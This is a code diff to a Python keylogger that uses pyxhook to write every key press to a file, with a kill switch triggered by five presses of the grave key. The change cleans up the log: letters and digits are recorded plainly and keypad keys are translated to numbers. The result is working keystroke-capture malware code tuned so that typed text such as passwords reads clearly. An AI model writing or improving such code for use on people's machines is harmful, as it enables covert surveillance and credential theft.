@@ -1,5 +1,5 @@
 import os
-
+import re
 import pyxhook
 import datetime
 
@@ -34,15 +34,39 @@ def OnKeyPress(event):
         recordKey.write("\n")
     elif event.Ascii == 96:  # 96 is the ascii value of the grave key (`)
         kill_event += 1
+        recordKey.write("<{0}>".format(str(event.Key)))
         if kill_event >= 5:
             recordKey.write("Killed!")
             hook.cancel()
     else:
         kill_event = 0
-        if 33 <= event.Ascii <= 126:
-            recordKey.write(str(event.Key) + "-" + str(event.Ascii))
+        if re.match("^[a-zA-Z0-9]$", event.Key):
+            recordKey.write(str(event.Key))
         else:
-            recordKey.write("<{0}>".format(str(event.Key)))
+            if event.Key == "P_Delete":
+                recordKey.write(".")
+            elif event.Key == "P_Insert":
+                recordKey.write("0")
+            elif event.Key == "P_End":
+                recordKey.write("1")
+            elif event.Key == "P_Down":
+                recordKey.write("2")
+            elif event.Key == "P_Next":
+                recordKey.write("3")
+            elif event.Key == "P_Left":
+                recordKey.write("4")
+            elif event.Key == "P_Begin":
+                recordKey.write("5")
+            elif event.Key == "P_Right":
+                recordKey.write("6")
+            elif event.Key == "P_Home":
+                recordKey.write("7")
+            elif event.Key == "P_Up":
+                recordKey.write("8")
+            elif event.Key == "P_Page_Up":
+                recordKey.write("9")
+            else:
+                recordKey.write("<{0}>".format(str(event.Key)))
 
     recordKey.close()
 
